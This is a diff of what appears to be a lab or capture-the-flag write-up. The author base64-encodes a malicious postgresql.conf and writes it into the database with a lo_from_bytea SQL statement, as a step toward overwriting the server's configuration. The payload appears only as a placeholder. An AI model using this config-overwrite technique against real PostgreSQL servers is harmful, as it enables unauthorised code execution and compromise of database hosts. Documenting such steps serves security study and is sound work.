@@ -300,7 +300,11 @@ Now the next step is to overwrite the current config with my malicious one
 cat postgesql.conf | base64 -w 0 | xclip -selection clipboard
 ```
 
-Ill cat the malicious conf file then base64 encode its output and diabl
+Ill cat the malicious conf file then base64 encode its output and disable word wrap, then copy to clipboard
+
+```python
+SELECT lo_from_bytea(12345, decode('<base64 contents>', 'base64'))
+```
 
 ```python
 SELECT lo_from_bytea(12345, decode('<base64>', 'base64'))  
